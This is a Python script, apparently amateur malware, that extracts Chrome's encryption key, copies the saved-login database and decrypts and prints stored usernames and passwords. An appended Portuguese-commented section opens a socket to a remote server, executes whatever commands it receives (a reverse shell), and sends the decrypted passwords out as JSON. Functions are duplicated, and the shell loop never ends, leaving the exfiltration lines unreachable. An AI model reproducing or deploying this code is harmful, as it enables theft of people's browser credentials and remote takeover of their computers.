import os
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil
from datetime import timezone, datetime, timedelta

import socket
def chrome_date_and_time(chrome_data):
    return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data)

def fetching_encryption_key():

    local_computer_directory_path = os.path.join(
        os.environ["USERPROFILE"], "AppData", "Local", "Google",
        "Chrome", "User Data", "Local State")

    with open(local_computer_directory_path, "r", encoding="utf-8") as f:
        local_state_data = f.read()
        local_state_data = json.loads(local_state_data)

    encryption_key = base64.b64decode(
        local_state_data["os_crypt"]["encrypted_key"])

    encryption_key = encryption_key[5:]
    return win32crypt.CryptUnprotectData(
        encryption_key, None, None, None, 0)[1]

def password_decryption(password, encryption_key):
    try:
        iv = password[3:15]
        password = password[15:]

        cipher = AES.new(encryption_key, AES.MODE_GCM, iv)

        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return "No Passwords"
def chrome_date_and_time(chrome_data):
    return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data)
def fetching_encryption_key():

    local_computer_directory_path = os.path.join(
        os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome",
        "User Data", "Local State")
    with open(local_computer_directory_path, "r", encoding="utf-8") as f:
        local_state_data = f.read()
        local_state_data = json.loads(local_state_data)
    encryption_key = base64.b64decode(
        local_state_data["os_crypt"]["encrypted_key"])

    encryption_key = encryption_key[5:]

    return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]
def password_decryption(password, encryption_key):
    try:
        iv = password[3:15]
        password = password[15:]

        # generate cipher
        cipher = AES.new(encryption_key, AES.MODE_GCM, iv)

        # decrypt password
        return cipher.decrypt(password)[:-16].decode()
    except:

        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return "No Passwords"
def main():
    key = fetching_encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                           "Google", "Chrome", "User Data", "default", "Login Data")
    filename = "ChromePasswords.db"
    shutil.copyfile(db_path, filename)

    db = sqlite3.connect(filename)
    cursor = db.cursor()

    cursor.execute(
        "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
        "order by date_last_used")

    for row in cursor.fetchall():
        main_url = row[0]
        login_page_url = row[1]
        user_name = row[2]
        decrypted_password = password_decryption(row[3], key)
        date_of_creation = row[4]
        last_usuage = row[5]
        if user_name or decrypted_password:
            print(f"Main URL: {main_url}")
            print(f"Login URL: {login_page_url}")
            print(f"User name: {user_name}")
            print(f"Decrypted Password: {decrypted_password}")
        else:
            continue
        if date_of_creation != 86400000000 and date_of_creation:
            print(f"Creation date: {str(chrome_date_and_time(date_of_creation))}")

        if last_usuage != 86400000000 and last_usuage:
            print(f"Last Used: {str(chrome_date_and_time(last_usuage))}")
        print("=" * 100)
    cursor.close()
    db.close()
    try:
        # trying to remove the copied db file as
        # well from local computer
        os.remove(filename)
    except:
        pass
if __name__ == "__main__":
    main()







# Endereço IP e porta do servidor remoto
ip = "192.168.3.3"
porta = 80
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, porta))

while True:
    cmd = s.recv(1024).decode()
    for comando in os.popen(cmd).read():
        s.send(comando.encode())

# Obtendo a chave de criptografia do Chrome
encryption_key = fetching_encryption_key()

senhas_criptografadas = [
    b'DPAPI\x01\x00\x00\x00\x10h\xbbv\x00\x00\x00\x10\x03\x02\x81\xd2x\xab\x12a\x0e\xecR\x8f\xb3J\x9b\x1eV\xd2\xac\x86.\xfa\xb4\x17\x9a<\x9d6F\xed\xc0\x0bG\xbbhQ',
    b'DPAPI\x01\x00\x00\x00\x18\x13\xb0f\x00\x00\x00\x10\x82\xf6b7\xe8\xfcG\x84\xd1/\xb2Gp\x00\x86K\xd5\x88\xb2\xbb\xb6\xfb\xfd<\xd3c\xab\xdbW3\xa5\x0b\xdd',
]

# Descriptografando as senhas
senhas_descriptografadas = []
for senha in senhas_criptografadas:
    senha_descriptografada = password_decryption(senha, encryption_key)
    if senha_descriptografada is not None:
        senhas_descriptografadas.append(senha_descriptografada)

# Serializando as senhas descriptografadas em formato JSON
dados_json = json.dumps(senhas_descriptografadas)

# Enviando os dados de senha para o servidor
s.sendall(dados_json.encode())

s.close()
